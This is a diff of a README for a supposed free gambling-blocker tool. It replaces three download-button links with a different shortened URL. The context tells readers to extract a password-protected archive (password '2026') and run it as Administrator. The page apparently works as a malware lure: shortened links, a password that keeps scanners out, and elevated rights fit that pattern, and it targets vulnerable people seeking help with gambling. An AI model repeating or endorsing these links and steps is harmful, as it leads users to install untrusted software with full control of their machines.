@@ -9,7 +9,7 @@ The **🛡️ Casino Bet Blocker** is a **free** self-exclusion and gambling web
 
 <div align="center">
 
-[![Download Casino Bet Blocker](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/casino-bet-blocker)
+[![Download Casino Bet Blocker](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/LvcUB4n5IRkdiMTND)
 
 </div>
 
@@ -113,7 +113,7 @@ The **🛡️ Casino Bet Blocker** is a **free** self-exclusion and gambling web
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Complete setup → Set exclusion period
 
-[![Download Casino Bet Blocker](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/casino-bet-blocker)
+[![Download Casino Bet Blocker](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/LvcUB4n5IRkdiMTND)
 
 ### Detailed Installation (May 2026 Update)
 
@@ -272,7 +272,7 @@ Take control of your gambling habits for free. **Casino Bet Blocker** blocks 30,
 
 <div align="center">
 
-[![Download Casino Bet Blocker](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/casino-bet-blocker)
+[![Download Casino Bet Blocker](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/LvcUB4n5IRkdiMTND)
 
 **Version 4.6.1** — Free gambling blocker. May 2026 update. Zero cost. No payment.
 
